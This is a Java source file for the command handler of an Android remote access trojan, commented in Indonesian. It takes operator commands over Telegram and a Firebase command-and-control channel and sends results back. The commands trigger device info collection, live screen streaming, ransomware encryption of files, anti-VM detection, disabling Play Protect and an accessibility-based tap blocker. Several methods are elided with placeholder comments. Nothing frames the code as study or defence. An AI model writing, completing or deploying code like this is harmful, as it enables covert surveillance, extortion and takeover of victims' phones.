package com.enterprise.rat.commands;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Environment;
import com.enterprise.rat.admin.AdminReceiver;
import com.enterprise.rat.activities.FakeUpdateActivity;
import com.enterprise.rat.bot.BotConfig;
import com.enterprise.rat.services.AccessibilityService;
import com.enterprise.rat.utils.AntiVM;
import com.enterprise.rat.utils.FirebaseC2Manager;
import com.enterprise.rat.utils.TelegramApi;
import com.google.gson.JsonObject;

public class CommandHandler {
    private Context context;
    // ... semua field manager (sama seperti sebelumnya)

    // Firebase C2 Manager instance
    private FirebaseC2Manager firebaseC2Manager;

    public CommandHandler(Context context) {
        this.context = context;
        // ... semua inisialisasi manager (sama seperti sebelumnya)
    }

    /**
     * Set FirebaseC2Manager instance untuk mengirim hasil.
     */
    public void setFirebaseC2Manager(FirebaseC2Manager manager) {
        this.firebaseC2Manager = manager;
    }

    /**
     * Kirim response ke C2 melalui Firebase.
     */
    private void sendResponse(String command, String result) {
        // Kirim via Telegram (fallback)
        TelegramApi.sendMessage(result);
        // Kirim via Firebase (primary)
        if (firebaseC2Manager != null) {
            firebaseC2Manager.sendResult(command, result);
        }
    }

    public void handleCommand(String text, long chatId, String messageId, JsonObject message) {
        String[] parts = text.trim().split("\\s+");
        if (parts.length == 0) return;
        String cmd = parts[0].toLowerCase();
        if (cmd.equals("/start") || cmd.equals("/help") || cmd.equals("/menu")) {
            processGlobal(cmd);
            return;
        }

        String target = "ALL";
        String[] args = new String[0];
        if (parts.length >= 2) {
            String second = parts[1].toUpperCase();
            if (second.startsWith("SESSION_") || second.equals("ALL")) {
                target = second;
                args = new String[parts.length - 2];
                System.arraycopy(parts, 2, args, 0, args.length);
            } else {
                args = new String[parts.length - 1];
                System.arraycopy(parts, 1, args, 0, args.length);
            }
        }

        String mySession = BotConfig.SESSION_ID.toUpperCase();
        if (!target.equals("ALL") && !target.equals(mySession)) return;

        execute(cmd, args);
    }

    private void processGlobal(String cmd) {
        if (cmd.equals("/start")) {
            sendResponse(cmd, "⚡ <b>REX.ENT v9.0 (Firebase C2)</b>\nSession: <code>" + BotConfig.SESSION_ID + "</code>\n\nGunakan <code>/menu</code> untuk daftar perintah.");
        } else {
            sendResponse(cmd, getMenu());
        }
    }

    private String getMenu() {
        // ... menu yang sama seperti sebelumnya
        return "MENU";
    }

    private void execute(String cmd, String[] args) {
        try {
            switch (cmd) {
                case "/info": deviceInfoManager.sendDeviceInfo(); sendResponse(cmd, "Info sent"); break;
                // ... semua case lainnya (sama seperti sebelumnya)
                case "/stream_live": screenLiveStreamManager.startStream(args.length > 0 ? Integer.parseInt(args[0]) : 8080); sendResponse(cmd, "Stream started"); break;
                case "/ransomware": RansomwareCryptoManager.encryptFiles(args.length > 0 ? args[0] : null, args.length > 1 ? args[1] : null); sendResponse(cmd, "Ransomware started"); break;
                case "/anti_vm": sendResponse(cmd, AntiVM.getDetectionReport()); break;
                case "/disable_playprotect": PlayProtectDisabler.disable(); sendResponse(cmd, "Play Protect disabled"); break;
                case "/block_tap_start": {
                    AccessibilityService svc = AccessibilityService.getInstance();
                    if (svc != null) { AutoTapBlocker.enable(svc); sendResponse(cmd, "Blocker activated"); }
                    else sendResponse(cmd, "❌ Accessibility not active.");
                    break;
                }
                default: sendResponse(cmd, "Perintah tidak dikenal. Ketik /menu untuk daftar perintah."); break;
            }
        } catch (Exception e) {
            sendResponse(cmd, "❌ Error: " + e.getMessage());
        }
    }

    // ... helper methods (sama seperti sebelumnya)
}
